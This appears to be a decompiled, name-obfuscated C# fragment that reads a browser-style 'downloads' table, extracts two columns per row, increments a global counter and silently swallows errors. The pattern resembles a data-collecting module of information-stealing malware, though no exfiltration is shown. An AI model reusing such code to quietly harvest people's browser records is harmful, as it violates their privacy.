using System.Collections.Generic;
using ns13;

namespace ns12;

internal sealed class Class50
{
	public static List<Struct5> smethod_0(string string_0)
	{
		try
		{
			List<Struct5> list = new List<Struct5>();
			Class57 @class = Class58.smethod_0(string_0, "downloads");
			if (@class == null)
			{
				return list;
			}
			for (int i = 0; i < @class.method_1(); i++)
			{
				Struct5 item = default(Struct5);
				item.String_1 = Class46.smethod_2(@class.method_0(i, 2));
				item.String_0 = Class46.smethod_2(@class.method_0(i, 17));
				Class53.smethod_4(item.String_0);
				Class54.int_6++;
				list.Add(item);
			}
			return list;
		}
		catch
		{
			return new List<Struct5>();
		}
	}
}
